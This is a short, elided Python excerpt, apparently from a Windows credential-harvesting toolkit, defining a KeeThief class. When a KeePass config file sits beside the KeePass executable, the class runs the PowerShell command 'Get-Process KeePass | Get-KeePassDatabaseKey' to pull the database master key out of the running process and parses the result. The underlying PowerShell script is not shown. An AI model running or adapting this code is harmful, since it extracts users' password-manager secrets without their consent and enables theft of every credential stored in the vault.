...
from winsecs.utils import powershell_execute, log
...
class KeeThief:
    def run(self, full_exe_path):
        ...
        if os.path.isfile(os.path.join(os.path.dirname(full_exe_path), 'KeePass.config.xml')):
            output = powershell_execute(SCRIPT, 'Get-Process KeePass | Get-KeePassDatabaseKey')
            try:
                output = json.loads(output)
            except Exception:
                log.debug('WARNING', str(output))
                return
